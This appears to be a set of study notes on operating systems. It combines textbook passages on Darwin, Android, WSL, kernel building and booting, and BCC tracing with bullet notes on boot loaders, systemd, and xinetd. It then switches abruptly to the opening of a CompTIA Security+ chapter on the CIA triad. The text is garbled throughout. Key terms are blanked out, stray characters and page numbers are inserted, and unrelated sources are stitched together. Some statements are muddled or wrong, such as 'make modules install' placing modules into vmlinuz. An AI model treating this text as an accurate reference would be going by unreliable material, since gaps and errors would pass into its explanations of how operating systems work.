Beneath the system-call interface, Mach provides fundamental operating- system services, including memory management, CPU scheduling, and inter- process communication (IPC) facilities such as message passing and remote procedure calls (RPCs). Much of the functionality provided by Mach is available through                    , which include tasks (a Mach process), threads, memory objects, and ports (used for IPC). example, an application may create a new process using the BSD POSIX fork() system call. Mach will, in turn, use a task kernel abstraction to represent the process in the kernel.
In addition to Mach and BSD, the kernel environment provides an I/O kit for development of device drivers and dynamically loadable modules (which macOS refers to as                  , or      ).
In Section 2.8.3, we described how the overhead of message passing between different services running in user space compromises the performance of microkernels. To address such performance problems, Darwin combines Mach, BSD, the I/O kit, and any kernel extensions into a single address space. Thus, Mach is not a pure microkernel in the sense that various subsystems run in user space. Message passing within Mach still does occur, but no copying is necessary, as the services have access to the same address space. Apple has released the Darwin operating system as open source. As a result, various projects have added extra functionality to Darwin, such as the X- 11 windowing system and support for additional file systems. Unlike Darwin, however, the Cocoa interface, as well as other proprietary Apple frameworks available for developing macOS applications, are closed.
               
The Android operating system was designed by the Open Handset Alliance (led primarily by Google) and was developed for Android smartphones and tablet computers. Whereas iOS is designed to run on Apple mobile devices and is close-sourced, Android runs on a variety of mobile platforms and is open- sourced, partly explaining its rapid rise in popularity. The structure of Android appears in Figure 2.18.
Android is similar to iOS in that it is a layered stack of software that provides a rich set of frameworks supporting graphics, audio, and hardware features. These features, in turn, provide a platform for developing mobile applications that run on a multitude of Android-enabled devices.
Software designers for Android devices develop applications in the Java language, but they do not generally use the standard Java API. Google has designed a separate Android API for Java development. Java applications are compiled into a form that can execute on the Android RunTime ART, a virtual machine designed for Android and optimized for mobile devices with limited memory and CPU processing capabilities. Java programs are first compiled to a Java bytecode .class file and then translated into an executable .dex file. Whereas many Java virtual machines perform just-in-time (JIT) compilation to improve application efficiency, ART performs               (   ) compila-
                                         ART VM
applications
Android frameworks
native libraries
SQLite openGL webkit SSL JNI
surface manager Bionic
Linux kernel
HAL
media framework
hardware
Figure 2.18 Architecture of Google’s Android.
tion. Here, .dex files are compiled into native machine code when they are installed on a device, from which they can execute on the ART. AOT compi- lation allows more efficient application execution as well as reduced power consumption, features that are crucial for mobile systems.
Android developers can also write Java programs that use the Java native interface—or JNI—which allows developers to bypass the virtual machine and instead write Java programs that can access specific hardware features. Programs written using JNI are generally not portable from one hardware device to another.
The set of native libraries available for Android applications includes frameworks for developing web browsers (webkit), database support (SQLite), and network support, such as secure sockets (SSLs). Because Android can run on an almost unlimited number of hardware devices, Google has chosen to abstract the physical hardware through the hard- ware abstraction layer, or HAL. By abstracting all hardware, such as the camera, GPS chip, and other sensors, the HAL provides applications with a consistent view independent of specific hardware. This feature, of course, allows devel- opers to write programs that are portable across different hardware platforms.
The standard C library used by Linux systems is the GNU C library (glibc). Google instead developed the        standard C library for Android. Not only does Bionic have a smaller memory footprint than glibc, but it also has been designed for the slower CPUs that characterize mobile devices. (In addition, Bionic allows Google to bypass GPL licensing of glibc.)
                                 
At the bottom of Android’s software stack is the Linux kernel. Google has modified the Linux kernel used in Android in a variety of areas to support the special needs of mobile systems, such as power management. It has also made changes in memory management and allocation and has added a new form of IPC known as Binder (which we will cover in Section 3.8.2.1).
WINDOWS SUBSYSTEM FOR LINUX
Windows uses a hybrid architecture that provides subsystems to emu- late different operating-system environments. These user-mode subsystems communicate with the Windows kernel to provide actual services. Windows 10 adds a Windows subsystem for Linux (   ), which allows native Linux applications (specified as ELF binaries) to run on Windows 10. The typical operation is for a user to start the Windows application bash.exe, which presents the user with a bash shell running Linux. Internally, the WSL creates a                consisting of the init process, which in turn creates the bash shell running the native Linux application /bin/bash. Each of these processes runs in a Windows      process. This special process loads the native Linux binary into the process’s own address space, thus providing an environment in which a Linux application can execute.
Pico processes communicate with the kernel services LXCore and LXSS to translate Linux system calls, if possible using native Windows system calls. When the Linux application makes a system call that has no Windows equivalent, the LXSS service must provide the equivalent functionality. When there is a one-to- one relationship between the Linux and Windows system calls, LXSS forwards the Linux system call directly to the equivalent call in the Windows kernel. In some situations, Linux and Windows have system calls that are similar but not identical. When this occurs, LXSS will provide some of the functionality and will invoke the similar Windows system call to provide the remainder of the functionality. The Linux fork() provides an illustration of this: The Windows CreateProcess() system call is similar to fork() but does not provide exactly the same functionality. When fork() is invoked in WSL, the LXSS service does some of the initial work of fork() and then calls CreateProcess() to do the remainder of the work. The figure below illustrates the basic behavior of WSL.
user mode bash.exe
Linux instance init /bin/bash
kernel mode fork() CreateProcess() LXSS/LXCore
Windows kernel
                                         2.9 Building and Booting an Operating System
It is possible to design, code, and implement an operating system specifically for one specific machine configuration. More commonly, however, operating systems are designed to run on any of a class of machines with a variety of peripheral configurations.
2.9.1 Operating-System Generation
Most commonly, a computer system, when purchased, has an operating system already installed. example, you may purchase a new laptop with Windows or macOS preinstalled. But suppose you wish to replace the preinstalled oper- ating system or add additional operating systems. Or suppose you purchase a computer without an operating system. In these latter situations, you have a few options for placing the appropriate operating system on the computer and configuring it for use.
If you are generating (or building) an operating system from scratch, you must follow these steps:
   Write the operating system source code (or obtain previously written source code).
   Configure the operating system for the system on which it will run.    Compile the operating system.
   Install the operating system.
   Boot the computer and its new operating system.
Configuring the system involves specifying which features will be included, and this varies by operating system. Typically, parameters describing how the system is configured is stored in a configuration file of some type, and once this file is created, it can be used in several ways.
At one extreme, a system administrator can use it to modify a copy of the operating-system source code. Then the operating system is completely compiled (known as a             ). Data declarations, initializations, and constants, along with compilation, produce an output- object version of the operating system that is tailored to the system described in the configuration file.
At a slightly less tailored level, the system description can lead to the selec- tion of precompiled object modules from an existing library. These modules are linked together to form the generated operating system. This process allows the library to contain the device drivers for all supported I/O devices, but only those needed are selected and linked into the operating system. Because the system is not recompiled, system generation is faster, but the resulting system may be overly general and may not support different hardware configurations.
At the other extreme, it is possible to construct a system that is completely modular. Here, selection occurs at execution time rather than at compile or link time. System generation involves simply setting the parameters that describe the system configuration.
                                               
The major differences among these approaches are the size and generality of the generated system and the ease of modifying it as the hardware configu- ration changes. For embedded systems, it is not uncommon to adopt the first approach and create an operating system for a specific, static hardware config- uration. However, most modern operating systems that support desktop and laptop computers as well as mobile devices have adopted the second approach. That is, the operating system is still generated for a specific hardware config- uration, but the use of techniques such as loadable kernel modules provides modular support for dynamic changes to the system. We now illusrate how to build a Linux system from scratch, where it is typically necessary to perform the following steps:
   Download the Linux source code from http://www.kernel.org.
   Configure the kernel using the “make menuconfig” command. This step
generates the .config configuration file.
   Compile the main kernel using the “make” command. The make command compiles the kernel based on the configuration parameters identified in the .config file, producing the file vmlinuz, which is the kernel image.
   Compile the kernel modules using the “make modules” command. Just as with compiling the kernel, module compilation depends on the con- figuration parameters specified in the .config file.
   Use the command “make modules install” to install the kernel mod- ules into vmlinuz.
   Install the new kernel on the system by entering the “make install” command.
When the system reboots, it will begin running this new operating system. Alternatively, it is possible to modify an existing system by installing a Linux virtual machine. This will allow the host operating system (such as Windows or macOS) to run Linux. (We introduced virtualization in Section 1.7
and cover the topic more fully in Chapter 18.)
There are a few options for installing Linux as a virtual machine. One alternative is to build a virtual machine from scratch. This option is similar to building a Linux system from scratch; however, the operating system does not need to be compiled. Another approach is to use a Linux virtual machine appliance, which is an operating system that has already been built and con- figured. This option simply requires downloading the appliance and installing it using virtualization software such as VirtualBox or VMware. example, to build the operating system used in the virtual machine provided with this text, the authors did the following:
   Downloaded the Ubuntu ISO image from https://www.ubuntu.com/    Instructed the virtual machine software VirtualBox to use the ISO as the
bootable medium and booted the virtual machine
   Answered the installation questions and then installed and booted the operating system as a virtual machine System Boot
After an operating system is generated, it must be made available for use by the hardware. But how does the hardware know where the kernel is or how to load that kernel?
boot the system.
- The process of starting a computer by loading the kernel
- On most systems, the boot process proceeds as follows:
  - A small piece of code (bootstrap program / boot loader) locates the kernel.
  - The kernel is loaded into memory and started.
  - The kernel initializes hardware.
  - The root file system is mounted.
- Some
  - computer powered on
  - a small initial boot loader (BIOS) located in nonvolatile firmware is
run.
  - This BIOS/UEFI load a second boot loader (boot block), located at a
fixed disk location.
  - Look for bootable device (MBR/GPT), such as a local hard
drive.
  - on that bootable device is a predefined location, an actual fixed
address on a disk, master boot record,
  - or it's a modern equivalent, a GUI partition table, or GPT.
  - The main function of the MBR/GPT: bootstrap the boot loader
on your operating system.
  - in a Linux, GRUB, grand unified boot loader.
  - GRUB's job is to eventually load the kernel, and so it's going to keep track of where all the kernels are on your system, and it's going to tell the system if it needs to boot in a particular way.
  - For example, booting into single user mode rather than a full multi-user system, or target.
  - The program stored in the boot block may be sophisticated enough to load the entire operating system into memory and begin its execution.
  - typically, it is simple code (as it must fit in a single disk block) 847   - and knows only the address on disk and the length of the remainder of the bootstrap program.
  - once the kernel is off and running
  - doing its job of managing the hardware on the system
  - Once it's finished its part of the boot process, it startup/load the
init daemon.
  - starting up things like
  - maintains that precedence so things start up and work as
expected with the required resources or services needed.
  - control the state of the system,
  - on most Linux distributions, started off with the System V, initd init daemon.
  - initd is being replaced with a new init daemon, systemd.
- Many recent computer systems have replaced the BIOS-based boot process with UEFI(Unified Extensible Firmware Interface).
  - better support for 64-bit systems and larger disks.
  - UEFI is a single, complete boot manager, therefore is faster than the
multistage BIOS boot process. (greatest advantage)
Whether booting from BIOS or UEFI, the bootstrap program can perform a variety of tasks.
- loading the file containing the kernel program into memory
- runs diagnostics to determine the state of the machine
  - Example
  - inspecting memory and the CPUand discovering devices.
  - If the diagnostics pass, the program can continue with the booting
steps.
- also initialize all aspects of the system, from CPU registers to device
controllers and the contents of main memory.
- Sooner or later, it starts the operating system and mounts the root file
system.
  - only at this point system said to be running.
GRUB     is an open-source bootstrap program for Linux and UNIX systems. is loaded at startup.
- GRUB is flexible and allows changes to be made at boot time, including
modifying kernel parameters and even selecting among different kernels that can be booted.
- Example
- kernel parameters from the special Linux file /proc/cmdline, used at boot
time:
BOOT IMAGE=/boot/vmlinuz-4.4.0-59-generic root=UUID=5f2e2232-4e47-4fe8-ae94-45ea749a5c92
BOOT IMAGE is the name of the kernel image to be loaded into memory, root specifies a unique identifier of the root file system.
                                  
Linux kernel image
- To save space as well as decrease boot time, the Linux kernel image is a compressed file that is extracted after it is loaded into memory.
- During the boot process, the boot loader typically creates a temporary RAM file system, known as initramfs.
  - This file system contains necessary drivers and kernel modules that must be installed to support the real root file system (which is not in main memory).
- Once the kernel has started and the necessary drivers are installed, the kernel switches the root file system from the temporary RAM location to the appropriate root file system location.
- Finally, Linux creates the systemd process, the initial process in the system, and then starts other services (example, a web server and/or database).
- Ultimately, the system will present the user with a login prompt.
the booting mechanism is not independent from the boot loader.
- Therefore, there are specific versions of the GRUB boot loader for BIOS and
UEFI,
- and the firmware must know as well which specific bootloader is to be used.
The boot process for mobile systems is slightly different - Example - although its kernel is Linux-based, Android does not use GRUB and instead leaves it up to vendors to provide boot loaders.
- The most common Android boot loader is LK (little kernel).
- Android systems use the same compressed kernel image as Linux, as well as an initial RAM file system.
- However, whereas Linux discards the initramfs once all necessary drivers have been loaded, Android maintains initramfs as the root file system for the device.
- Once the kernel has been loaded and the root file system mounted, Android starts the init process and creates a number of services before displaying the home screen.
boot loaders for most operating systems provide booting into recovery/sigle-user mode for
- diagnosing hardware issues,
- fixing corrupt file systems,
- even reinstalling the operating system.
2.10 Operating-System Debugging
We have mentioned debugging from time to time in this chapter. Here, we take a closer look. Broadly,           is the activity of finding and fixing errors in a system, both in hardware and in software. Performance problems are considered bugs, so debugging can also include                   , which seeks to improve performance by removing processing            . In this section, we explore debugging process and kernel errors and performance problems. Hardware debugging is outside the scope of this text.
2.10.1 Failure Analysis
If a process fails, most operating systems write the error information to a         to alert system administrators or users that the problem occurred. The operating system can also take a          —a capture of the memory of the process — and store it in a file for later analysis. (Memory was referred to as the
                                        
“core” in the early days of computing.) Running programs and core dumps can be probed by a debugger, which allows a programmer to explore the code and memory of a process at the time of failure.
Debugging user-level process code is a challenge. Operating-system kernel debugging is even more complex because of the size and complexity of the kernel, its control of the hardware, and the lack of user-level debugging tools. A failure in the kernel is called a      . When a crash occurs, error information is saved to a log file, and the memory state is saved to a           . Operating-system debugging and process debugging frequently use dif- ferent tools and techniques due to the very different nature of these two tasks. Consider that a kernel failure in the file-system code would make it risky for the kernel to try to save its state to a file on the file system before rebooting. A common technique is to save the kernel’s memory state to a section of disk set aside for this purpose that contains no file system. If the kernel detects an unrecoverable error, it writes the entire contents of memory, or at least the kernel-owned parts of the system memory, to the disk area. When the system reboots, a process runs to gather the data from that area and write it to a crash dump file within a file system for analysis. Obviously, such strategies would be unnecessary for debugging ordinary user-level processes.
2.10.2 Performance Monitoring and Tuning
We mentioned earlier that performance tuning seeks to improve performance by removing processing bottlenecks. To identify bottlenecks, we must be able to monitor system performance. Thus, the operating system must have some means of computing and displaying measures of system behavior. Tools may be characterized as providing either per-process or system-wide observations. To make these observations, tools may use one of two approaches—counters or tracing. We explore each of these in the following sections.
                 
Operating systems keep track of system activity through a series of counters, such as the number of system calls made or the number of operations performed to a network device or disk. The following are examples of Linux tools that use counters:
           
- ps—reports information for a single process or selection of processes
- top—reports real-time statistics for current processes            
- vmstat — reports memory-usage statistics
- netstat — reports statistics for network interfaces
- iostat—reports I/O usage for disks
                                   Figure 2.19 The Windows 10 task manager.
Most of the counter-based tools on Linux systems read statistics from the /proc file system. /proc is a “pseudo” file system that exists only in kernel memory and is used primarily for querying various per-process as well as kernel statistics. The / proc file system is organized as a directory hierarchy, with the process (a unique integer value assigned to each process) appearing as a subdirectory below /proc. example, the directory entry /proc/2155 would contain per-process statistics for the process with an ID of 2155. There are /proc entries for various kernel statistics as well. In both this chapter and Chapter 3, we provide programming projects where you will create and access the /proc file system.
Windows systems provide the                     , a tool that includes information for current applications as well as processes, CPU and memory usage, and networking statistics. A screen shot of the task manager in Windows 10 appears in Figure 2.19.
2.10.3 Tracing
Whereas counter-based tools simply inquire on the current value of certain statistics that are maintained by the kernel, tracing tools collect data for a specific event—such as the steps involved in a system-call invocation.
The following are examples of Linux tools that trace events:            
- strace—traces system calls invoked by a process
- gdb—a source-level debugger
           
- perf—a collection of Linux performance tools - tcpdump—collects network packets
                                         Kernighan’s Law
“Debugging is twice as hard as writing the code in the first place. Therefore, if you write the code as cleverly as possible, you are, by definition, not smart enough to debug it.”
Making operating systems easier to understand, debug, and tune as they run is an active area of research and practice. A new generation of kernel- enabled performance analysis tools has made significant improvements in how this goal can be achieved. Next, we discuss BCC, a toolkit for dynamic kernel tracing in Linux.
2.10.4 BCC
Debugging the interactions between user-level and kernel code is nearly impossible without a toolset that understands both sets of code and can instru- ment their interactions. For that toolset to be truly useful, it must be able to debug any area of a system, including areas that were not written with debug- ging in mind, and do so without affecting system reliability. This toolset must also have a minimal performance impact—ideally it should have no impact when not in use and a proportional impact during use. The BCC toolkit meets these requirements and provides a dynamic, secure, low-impact debugging environment.
    (BPF Compiler Collection) is a rich toolkit that provides tracing fea- tures for Linux systems. BCC is a front-end interface to the eBPF (extended Berkeley Packet Filter) tool. The BPF technology was developed in the early 1990s for filtering traffic across a computer network. The “extended” BPF (eBPF) added various features to BPF. eBPF programs are written in a subset of C and are compiled into eBPF instructions, which can be dynamically inserted into a running Linux system. The eBPF instructions can be used to capture specific events (such as a certain system call being invoked) or to monitor system per- formance (such as the time required to perform disk I/O). To ensure that eBPF instructions are well behaved, they are passed through a         before being inserted into the running Linux kernel. The verifier checks to make sure that the instructions do not affect system performance or security.
Although eBPF provides a rich set of features for tracing within the Linux kernel, it traditionally has been very difficult to develop programs using its C interface. BCC was developed to make it easier to write tools using eBPF by providing a front-end interface in Python. A BCC tool is written in Python and it embeds C code that interfaces with the eBPF instrumentation, which in turn interfaces with the kernel. The BCC tool also compiles the C program into eBPF instructions and inserts it into the kernel using either probes or tracepoints, two techniques that allow tracing events in the Linux kernel.
The specifics of writing custom BCC tools are beyond the scope of this text, but the BCC package (which is installed on the Linux virtual machine we provide) provides a number of existing tools that monitor several areas
𐀀                                  of activity in a running Linux kernel. example, the BCC disksnoop tool
traces disk I/O activity. Entering the command
./disksnoop.py
generates the following example output:
TIME(s)
1946.29186700
1946.33965000
1948.34585000
1950.43251000
1951.74121000
T BYTES LAT(ms) R 8 0.27 R 8 0.26 W 8192 0.96 R 4096 0.56 R 4096 0.35 This output tells us the timestamp when the I/O operation occurred, whether the I/ O was a Read or Write operation, and how many bytes were involved in the I/O. The final column reflects the duration (expressed as latency or LAT) in milliseconds of the I/O.
Many of the tools provided by BCC can be used for specific applications, such as MySQL databases, as well as Java and Python programs. Probes can also be placed to monitor the activity of a specific process. example, the command
./opensnoop -p 1225
will trace open() system calls performed only by the process with an identifier of 1225.
Figure 2.20 The BCC and eBPF tracing tools.
                                         
What makes BCC especially powerful is that its tools can be used on live production systems that are running critical applications without causing harm to the system. This is particularly useful for system administrators who must monitor system performance to identify possible bottlenecks or security exploits. Figure 2.20 illustrates the wide range of tools currently provided by BCC and eBPF and their ability to trace essentially any area of the Linux operat- ing system. BCC is a rapidly changing technology with new features constantly being added.
Systemd
Once it's finished its part of the boot process, it startup/load the init daemon.
- the first user process outside of the kernel, process ID one, pid 1.
- the first process on the system, the parent to all other processes.
- its job is to start up the system and get it into a state that's usable
- Now that the first process init is up and running, it has a huge responsibility.
  - responsible for the orderly startup of system services.
  - starting up things like
  - SSH, Apache, if you're running a web server,
  - things like syslog and your mail daemon,
  - even your desktop manager, like GNOME desktop,
  - all things that you're looking at when you first log into your
Linux box.
  - maintains that precedence so things start up and work as expected
with the required resources or services needed.   - it do this in order.
  - For example, want Apache starting before your network
interfaces are online?
  - control the state of the system,
- it can move between a fully functioning, multi-user system with a desktop manager running, to single-user mode, and back.
- This transition is managed by init. And all of this is done so that we can present a usable system to the user.
On most Linux distributions, started off with the System V, initd init daemon.
- Initd had a concept of runlevels
  - various states that the system could be in
  - transitioning between runlevels meant that you executed a series of
scripts to start and stop the appropriate services to transition you to the runlevel that you wanted to be in.
- Examples
  - runlevel zero, which is off,
  - runlevel one, which is single-user mode,
  - runlevel three, which is a fully functioning system with networking
but no graphical console.
  - several other runlevels, up to runlevel six.
initd is being replaced with a new init daemon, systemd.
 - isn't just an initialization daemon, but also a collection of programs to manage system
- to start up the system, and starts all services via inter-process communication via sockets
  - significantly different: initd used scripts.
  - Using IPC rather than scripts
  - Starting services in systemd is asynchronous
  - services that aren't dependent upon each other,
can start at the same time, rather than in order defined by a
serial initialization process.
  - This parallelism enables quicker startup times.
  - do more things in parallel, at the same time,
  - faster boot times and transitions between states, or, targets.
  - its job is to start less and start more in parallel.
  - performance is why systemd was built, performance can mean a lot of things,
  - quicker loading times,
  - for end users, get into their machines faster and start working.
  - for systems administrators, servers are online faster, servicing
user requests, very important for systems that require high availability.
- dependency management, what needs to be started for a particular service to work,
  - init uses a foldering system, scripts are placed and named in a particular order that which they need to be executed.
  - systemd, define the system state, and IPC is used to communicate to the resources when to start.
- On demand service startup.
  - init, if a service went down, an external actor had to come in and deal
with it.
  - systemd, it can restart services automatically, if it's configured to do
so.
- unified logging.
  - still have /var/log,
  - but systemd brings journald, a unified interface into the logging environment on system that you can query.
- process tracking.
  - Control groups allow to assign policy to groups of processes or other system resources.
  - to limit the amount of memory a particular control group can use.
systemd architecture
 - Units: systemd's abstraction for a system resource.
- Targets: runlevels, a defined state that the system can be in.
- control groups: put units into groups and manage them.
units
- A unit is the key abstraction to describe a system resource/component in systemd.
  - can be anything, service, device, mounted file system, partition.
- units implemented as files on your file system.
- Units have state
  - active or inactive,: started or stopped
  - activating and deactivating. ▪


##   - Enabled or disabled
  - enable a unit
  - put a symbolic link in a specific location in the /etc/systemd folder.
- A group of units represents the state of a system
  - units are going to be in a particular state, active or inactive
  - and that grouping of units is the system state.
  - the purpose of the initialization daemon is to control the state of the
system, the things that are running at a particular point in time.
- Units can also have dependency.
  - one unit depends on another unit and build a dependency tree. We could have a
  - before dependency: this unit is needed before the activation of another unit
  - after dependency: this unit comes after another.
  - requires,: a unit already needs to be running when this unit activates
  - Conflicts: it can't be running when this unit is running.
  - So earlier I said that units are the core abstraction used to describe
information about a system resource or component on our systemd- based Linux system.
units types
- Service: do things like start and stop daemons.
socket. used to encapsulate inter-process communication among systemd units.
  - Systemd creates 探出 eliciting sockets for all units on a system that support it, and it messages these units via the socket, socket-based activation.
  - Unit A can message Unit B via the socket.
  - this is how systemd start services asynchronously and in parallel
without having to wait.
  - Systemd composed a request onto a socket, and it will queue and wait
for that unit, and when the unit is ready, it will process the request.
  - The socket unit can also represent a socket-based service, things like
cups and RPC.
A slice
  - a collection of units generally formed in a hierarchy.
  - used for managing the resources used in a slice and also used in
 ▪


## control groups.
Scopes
  - processes that are started externally to systemd,
  - example, if we start a program at the command line, it'll be in a scope.
snapshot
  - a point in time representation of the current state of a system's units.
  - if start up a bunch of services, and then take a snapshot,
  - could reboot the system and tell systemd to restore the system to that
state. Device units
  - represent kernel-based devices, and can be used in what's called device-based activation.
  - can do things like plug in a piece of hardware and have the system react accordingly, like USB drives.
Mount units
  - represent file systems that are mounted.
  - It's important to note that sometimes units can be registered with
systemd, and not defined in a unit file.
  - And this is a prime example of that. Mounted file systems are defined
in /etc/fstab. Swap units
  - represent our swap file system on our system.
Automount
  - when we mount the file system at runtime
  - when a person or a process accesses a particular directory, it will
attempt to mount that resource at that time.
  - can configure systemd to manage this for us.
path units
  - can monitor a particular file or directory,
  - if something changes or shows up in that directory, can configure
systemd to react in a predefined way.
timer units
  - have systemd do things at a specified time interval
  - by default, there's a timer to clean up temp files on your system.
units are files, like everything else on our Unix system, 859

- Unit files: specify the behavior and the configuration of the things that they represent.
  - for a service, tell the system where the binary for the actual program is,
  - to define a login directory, can do that in the unit file.
- define how the unit to act or react when start, stop, or restart.
- define things like service dependencies.
- many more options available inside unit configuration files: man systemd.unit
units are likely come along with the software in installation packages, or with the Linux distribution itself.
since they're defined in text files, they need to live in certain areas of the file systems
- users or administrators created: /etc/systemd/system.
- dynamically generated at runtime: /run/systemd/system.
  - /var/run is a symlink to run and can be used interchangeably.
- installed with software packages: /usr/lib/systemd/system.
- may have conflicting or overlapping unit files,
  - if unit files live in more than one of these directories.
  - to deal with this conflict, systemd has a concept of precedence.
  - files that are in /etc/systemd/system override those that are in /run/
systemd/system, which override those that are in /usr/lib/systemd/ system (the lowest precedence)
- When defining a unit, you can wholly override a unit's default configuration by copying the unit file from a lower precedence directory into a higher precedence directory.
  - example,
  - take one that came from the installation package in /usr/lib/systemd/
system, and place that into /etc/systemd/system,
  - make your overrides in that user admin created file.
unit files standard naming convention.
- Unit_name.unit_type_extension. - web server's unit file: httpd.service.
inside a unit file: stanzas - Unit
  - basic description of the unit
  - a description, the actual text that describes the unit, its dependencies,
and links to its documentation.
- Service
  - a block of code
  - where define where the service's binary is, what to do when start, stop, or restart the service, and pointers to configuration files for that particular service.
- Install
  - where to define what happens when you enable or disable this unit.
  - place or remove a symlink in a specific directory that represents the
state of the system
systemd - Targets
in initd-based systems
- runlevels, numbered from zero to six
- runlevels represent a collection of services that defined the running state of the system at that particular runlevel.
in systemd - Targets
- a grouping of units in particular states, this could be any type of unit.
- The file systems that may need to be mounted, the timers that may need to fire, all of the things that represent the particular state of the system.
- can use systemd to move between these states or to move between these targets.
predefined targets. name targets
- predefined collections of units in particular states
- some of these actually even align with initd's runlevels
- Poweroff (0), which maps back to initd's runlevel zero.
- rescue target, in initd, was singleuser mode, or runlevel one.
- multi-user target, runlevels two, three, or four.
- the graphical target, the multi-user target with the graphical user interface loaded
- the reboot target, to restart the system, which was runlevel six.
- some additional targets:
- Emergency, read only root access to your system.
- hibernate, saves the system state to disk, and then powers it down
- suspend target, saves the state of system to RAM and puts it in a low power mode, allowing restore it to that exact point.
when you enable a service, it will place a symbolic link in a directory for that target, in /etc/systemd/system. systemd - Control Groups and Journals
Systemd isn't all just services and transitioning between system states or replacing initd.
- It's an encompassing way to manage your system
control groups, cgroups.
- Processes started by systemd on system, are assigned to control
groups.
- Control groups are organized by service, scope, and slice.
  - service: a collection of processes started by systemd.
  - scope: a group of processes started externally to systemd. like
programs launched from a command line by an end user.
  - Slices: groupings of services and scopes together.
- control groups provide runtime performance information,
  - so can easily hone down if a particular unit is consuming
system resources, such as disk CPU, memory, and network IO.   - limit the amount of memory a control group can use,
  - limit the amount of disk IO that it can perform.
  - set CPU wait, to increase or decrease its scheduling priority
on system.
  - all configurable in the unit's unit file.
- can carve up your resources on your system and assign them to your liking.
  - beneficial because can provision for a load more accurately,
  - or perhaps contain a resource hog of an application.
  - valuable in hosting scenarios, shared servers and users pay
for the resources that they're consuming,
  - or cap those resources at particular limits if need to.
journal
- control groups provide process accounting,
- systemd offers another critical function, logging by journal, via the
journald service.
- main function is to collect and store login information from several sources and provide access to this information.
- Some of the places that you'll get information from is the kernel,
  - programs implementing a syslog function or the
sd_journal_print function from the journald API,
  - get information from stdout and stderr from system services
  - any auditing enabled on system.
- journald data, it's runtime information only by default.
  - if reboot, data go away.
- to configure it for persistent retention.
- The data stored in the journald system is structured and indexed
  - able to access the information faster and more efficiently than
text-based data   - have to use a tool to access the data, and that tool is journalctl.
Extended Internet Services Daemon - xinetd
- xinetd is kind of like a meta-daemon.
- It's a daemon's daemon.
- it's really used for services that don't warrant being up all the time.
how it works
- upon a connection to a particular port, xinetd will start up the
appropriate process to service that request.
- it's really intended for services that have a short life or used
infrequently
  - things like TFTP, or Telnet. ## 1. Fundamental Concepts
Chapter 1 Mastering Security Basics
CompTIA Security+ objectives covered in this chapter:
2.2 Given a scenario, use appropriate software tools to assess the security posture of an organization.
Command line tools (ping, netstat, tracert,arp, ipconfig/ip/
ifconfig)
3.2 Given a scenario, implement secure network architecture concepts.
Segregation/segmentation/isolation (Virtualization)
3.7 Summarize cloud and virtualizationconcepts.
Hypervisor (Type I, Type II, Application cells/containers), VM sprawl avoidance, VM escape protection, VDI/VDE
3.8 Explain how resiliency and automation strategies reduce risk. Non-persistence (Snapshots, Revert to known state, Rollback to known configuration), Elasticity, Scalability
5.7 Compare and contrast various types of controls.
Deterrent,Preventive,Detective,Corrective,Compensating, Technical, Administrative, Physical
6.1 Compare and contrast basic concepts of cryptography. Commonusecases(Supportingconfidentiality,Supporting integrity, Supportingobfuscation,Supportingnon-repudiation,
Resource vs. security constraints) **
Before you dig into some of the details of security, you should have a solid
understanding of
core security goals. This chapter introduces many of these core goals to provide a big picture of the concepts, and introduces basic risk concepts. Security controls reduce risks and you’ll learn about different security control categories in this chapter. You’ll also learn about virtualization and have a chance to do some labs to set up a virtual environment. Finally, this chapter includes some relevant commands that you can run on your primary computer or within a virtual machine.
Understanding Core Security Goals
Security starts with several principles that organizations include as core security goals. These principles drive many security-related decisions at multiple levels. Understanding these basic concepts will help you create a solid foundation in security. Confidentiality, integrity, and availability together form the CIA security triad, a model used to guide security principles within an organization. Each element is important to address in any security program.
What Is a Use Case?
CompTIA includes the term use case in multiple objectives. A use case describesagoalthatanorganizationwantstoachieve.Engineersuseitin systems analysis and software development to identify and clarify requirements to achieve the goal. A common naming strategy for a use case is in the verb-noun format. example,considerausecasenamed“Place Order.”Differentdepartmentswithinan organization might use it differently, but it can still retain the same name. In Chapter 7, “Protecting Against Advanced Attacks,” you’ll read about development life- cycle models such as agile. The agile model uses a set of principles that can be shared by cross- functional teams—employees in different departments. Developers can use the steps in the use case to create software to support the goal. The use case can help marketing personnel understand where they need to focus their efforts to motivate the buyer to start the process of placing an order. Billing and Shipping departments use it to understand their responsibilities
after the customer places the order.
Imagine that Lisa wants to place an order via an online e-commerce
system. The Place Order use case for this might include the following elements: Actors. Lisa is one of the actors. She might have an account and be a registered user with her shipping and billing information in an existing database. Or, she might be a brand-new customer and her information needs to be collected. Other actors include the billing system that bills her for the order and a fulfillment system that processes and ships the order.
Precondition. A precondition must occur before the process can start. example, Lisa needs to select an item to purchase before she can place theorder.
Trigger. A trigger starts the use case. In this case, it could be when Lisa clicks on the shopping cart to begin the purchase process.
Postcondition. Postconditions occur after the actor triggers the process. In this case, Lisa’s order will be put into the system after she completes the purchase. She’ll receive an acknowledgment for her order, the Billing department may take additional steps to bill her (if she wasn’t billed during the purchase process), and the Shipping department will take steps to ship the product.
Normal flow. A use case will typically list each of the steps in a specific order. In this example, you might see a dozen steps that start when Lisa picks an item to order and end when she completes the order and exits the purchase system. Alternate flow. All purchases won’t be the same. example, instead of using existing billing and shipping information, Lisamight want to use a different credit card or a different shipping address. It’s also possible for Lisa to change her mind and abandon the process before completing the purchase or even cancel the purchase after she completes the process.
Note that these are not the only possible elements in a use case. There are many more.
However, you don’t need to be an expert in agile to understand the overall concept of a use case. If you want to be an expert in agile, you can pursue the Project Management Institute Agile Certified Practitioner (PMI-ACP) certification. It requires at least 2,000 hours of general project experience working on teams, 1,500 hours working on agile project teams or with agile methodologies, and at least 21 hours of in-classroom training. The point is thatpassingtheCompTIASecurity+examdoesn’trequireyoutohavethe
PMI-ACP or to know all the elements of use cases. It does require you to understand the basic concept of a use case.
Thefollowingsectionsdiscusssomecommonusecasesrelatedtosupportingco integrity, availability, authentication, obfuscation, and non-repudiation.
Ensure Confidentiality
A common use case that any organization has is to support confidentiality. Confidentiality prevents the unauthorized disclosure of data. In other words, authorized personnel can access the data, but unauthorized personnel cannot access the data. You can ensure confidentiality using several different methods discussed in the following sections.
Encryption
Encryption scrambles data to make it unreadable by unauthorized personnel. Authorized personnel can decrypt the data to access it, but encryption techniques make it extremely difficult for unauthorized personnel to access encrypted data. Chapter 10,“Understanding Cryptography and PKI,” covers encryption in much more depth, including commonly used encryption algorithms like Advanced Encryption Standard (AES).
example, imagine you need to transmit Personally Identifiable Information (PII), such as medical information or credit card data via email. You wouldn’t want any unauthorized personnel to access this data, but once you click Send, you’re no longer in control of the data. However, if you encrypt the email before you send it, you protect the confidentiality of the data.
Access Controls
